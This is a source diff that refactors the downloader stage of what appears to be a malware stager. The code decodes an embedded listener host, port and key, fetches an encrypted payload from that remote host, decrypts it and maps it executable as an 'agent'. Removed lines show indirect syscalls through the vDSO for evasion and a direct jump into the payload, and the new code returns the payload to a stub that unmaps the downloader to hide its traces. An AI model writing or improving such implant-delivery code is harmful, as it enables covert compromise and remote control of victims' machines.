@@ -1,7 +1,7 @@
 #define _GNU_SOURCE
 #include "packer.h"
 #include "rc4.h"
-#include "state.h"
+#include "stage_abi.h"
 #include "syscalls.h"
 #include "transport.h"
 #include "utils.h"
@@ -32,14 +32,20 @@ static const unsigned char encoded_port[] = {ENCODED_PORT};
 static const unsigned char encoded_path[] = {ENCODED_PATH};
 static const unsigned char encoded_key[] = {ENCODED_KEY};
 
-static void downloader_main(void) {
-  /* Allocate a dedicated RW state page and bind it to %r15. The stager image
-   * is mapped RX by the self-unpacker, so all mutable globals (syscall gadget
-   * cache, dl* cache) live in this mmap'd page instead of .data. */
-  stager_state_init();
-
-  /* Resolve vDSO syscall gadget before any other syscalls */
-  init_indirect_syscalls();
+/*
+ * Downloader stage.
+ *
+ * This runs from a separately-mapped blob managed by the stub. It owns all of
+ * the networking/decryption code and the encoded listener configuration; as
+ * soon as it returns, the stub unmaps it, so none of that survives into the
+ * supervising phase.
+ *
+ * On success res->data points at the decrypted, executable agent PIC (a
+ * separate mmap that the stub keeps) and res->size is its length.
+ */
+void downloader_main(struct download_result *res) {
+  res->data = NULL;
+  res->size = 0;
 
   char host[256];
   char port[16];
@@ -61,7 +67,7 @@ static void downloader_main(void) {
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (stage_blob == MAP_FAILED) {
     debug_print("Stage0: mmap failed\n");
-    exit(1);
+    return;
   }
 
   size_t downloaded_size = transport_download(host, port, path, stage_blob,
@@ -70,7 +76,7 @@ static void downloader_main(void) {
   if (downloaded_size == 0) {
     debug_print("Stage0: download failed\n");
     munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
-    exit(1);
+    return;
   }
 
   // Decrypt the full staged blob (reflective shared objective shellcode
@@ -83,31 +89,21 @@ static void downloader_main(void) {
   if (mprotect(stage_blob, MAX_STAGE_BLOB_SIZE, PROT_READ | PROT_EXEC) != 0) {
     debug_print("Stage0: mprotect failed\n");
     munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
-    exit(1);
+    return;
   }
 
-  debug_print("Stage0: downloaded %d bytes, jumping to Stage1\n",
+  debug_print("Stage0: downloaded %d bytes, handing off to stub\n",
               (int)downloaded_size);
-
-  typedef void (*stage1_entry)(void *base_addr, size_t total_size);
-  stage1_entry entry = (stage1_entry)stage_blob;
-  entry(stage_blob, downloaded_size);
-
-  exit(0);
+  res->data = (char *)stage_blob;
+  res->size = downloaded_size;
 }
 
-__attribute__((visibility("default"))) int main(void) {
-  downloader_main();
-  return 0;
-}
-
-// Start routine similar to main.c but calls downloader_main
+/*
+ * Entry point of the downloader blob (offset 0). `jmp` (not `call`) keeps the
+ * stub's return address and the result pointer in RDI untouched, so
+ * downloader_main returns directly to the stub once it has the agent PIC.
+ */
 __asm__(".section .init,\"ax\",@progbits\n"
         ".global _start\n"
         "_start:\n"
-        "xor %rbp, %rbp\n"
-        "and $0xfffffffffffffff0, %rsp\n"
-        "call downloader_main\n"
-        "mov $60, %rax\n"
-        "xor %rdi, %rdi\n"
-        "syscall\n");
+        "jmp downloader_main\n");
